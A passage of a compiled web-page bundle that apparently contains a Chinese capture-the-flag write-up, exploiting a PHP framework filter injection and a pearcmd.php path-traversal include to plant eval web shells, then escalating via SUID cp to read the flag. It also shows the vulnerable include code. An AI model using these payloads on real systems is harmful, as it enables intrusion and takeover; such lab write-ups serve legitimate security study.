72\n\n_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u8fd9\u91ccsystem\u88ab\u7981\u7528\u4e86\uff0c\u7528\u4e0d\u4e86\uff0cphpinfo\u8fd8\u662f\u53ef\u4ee5\u51fa\u7684"}),"\n",(0,c.jsx)(e.p,{children:"\u63a5\u7740\u6211\u4eec\u5199\u4e2ashell"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"_method=__construct&filter[]=exec&method=get&server[REQUEST_METHOD]=echo '<?php eval($_POST['cmd']);?>' > /var/www/public/1.php\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u8681\u5251\u8fde\u4e0a\uff0cflag\u662f\u6ca1\u6709\u6743\u9650\u7684"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240319211124078.png",alt:"image-20240319211124078"})}),"\n",(0,c.jsx)(e.p,{children:"\u5c1d\u8bd5suid\u8fdb\u884c\u63d0\u6743"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"find / -type f -perm -4000 2>/dev/null\n"})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240319211424296.png",alt:"image-20240319211424296"})}),"\n",(0,c.jsx)(e.p,{children:"\u5229\u7528cp"}),"\n",(0,c.jsx)(e.p,{children:"/dev/stdout\u5c31\u662f\u6807\u51c6\u8f93\u51fa"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"cp /flag_dd3f6380aa0d /dev/stdout\n"})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240319211510379.png",alt:"image-20240319211510379"})}),"\n",(0,c.jsx)(e.h3,{id:"4-\u590d\u76d8",children:"4-\u590d\u76d8"}),"\n",(0,c.jsx)(e.p,{children:"\u7ed9\u4e86\u6e90\u7801"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"<?php \n        if (isset($_GET['page'])) {\n          $page ='pages/' .$_GET['page'].'.php';\n\n        }else{\n          $page = 'pages/dashboard.php';\n        }\n        if (file_exists($page)) {\n          require_once $page; \n        }else{\n          require_once 'pages/error_page.php';\n        }\n ?>\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u5b58\u5728\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\uff0c\u5229\u7528pearcmd.php\uff08\u548cweek3\u7684include\u76f8\u4f3c\uff09"}),"\n",(0,c.jsx)(e.p,{children:"payload"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"page=../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_POST['a'])?>+/var/www/html/1.php\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u63a5\u7740\u8fdb\u884csuid\u63d0\u6743"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240321120153032.png",alt:"image-20240321120153032"})})]})}function t(n={}){const{wrapper:e}={...(0,a.R)(),...n.components};return e?(0,c.jsx)(e,{...n,children:(0,c.jsx)(h,{...n})}):h(n)}}}]);